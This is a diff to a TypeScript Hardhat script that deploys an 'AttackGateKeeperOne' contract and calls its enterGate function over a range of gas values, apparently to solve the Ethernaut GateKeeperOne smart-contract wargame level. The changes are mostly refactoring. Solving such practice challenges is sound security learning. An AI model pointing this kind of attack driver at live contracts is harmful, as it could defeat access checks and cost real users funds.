@@ -6,23 +6,19 @@ async function attackGateKeeperOne() {
     const _gasLowerLimit = 50;
     const _gasUpperLimit = 300;
     const args: any[] = [];
-    const deployer = process.env.PRIVATE_KEY || "";
+    const player = process.env.PRIVATE_KEY || "";
     // [deployer] = await ethers.getSigners();
 
     // Don't touch below 🚀
-    // Vulnerability comes from the possibility of making a malicious contract the king
+    // Vulnerability comes from meeting all requirements
     // Additional read:
     // site here
 
     // deploying attack contract here
-    // const deployed = await deployContract(hre, "AttackGateKeeperOne", args);
-    // alternative below
     console.log("Deploying attack contract AttackGateKeeperOne...");
-    const Factory = await ethers.getContractFactory("AttackGateKeeperOne", deployer);
-    const attackGateKeeperOne = await Factory.deploy();
-    console.log(attackGateKeeperOne);
-    console.log(`Contract deployed to ${attackGateKeeperOne.address}`);
-    console.log("Attack contract deployed...");
+    const attack = await (await ethers.getContractFactory("AttackGateKeeperOne", player)).deploy();
+    console.log(attack);
+    console.log(`Attack contract deployed to ${attack.address}`);
     // experimantal verify below
     // if (attackGateKeeperOne.address){
     //     console.log("Verifying contract...");
@@ -41,7 +37,6 @@ async function attackGateKeeperOne() {
     // }
 
     // don't touch below
-    const attack = await ethers.getContractAt("AttackGateKeeperOne", attackGateKeeperOne.address);
     const tx = await attack.enterGate(_gateAddress, _gasLowerLimit, _gasUpperLimit);
     const txReceipt = await tx.wait(1);
     const event1 = await txReceipt.events[0].args.succeeded.toString();
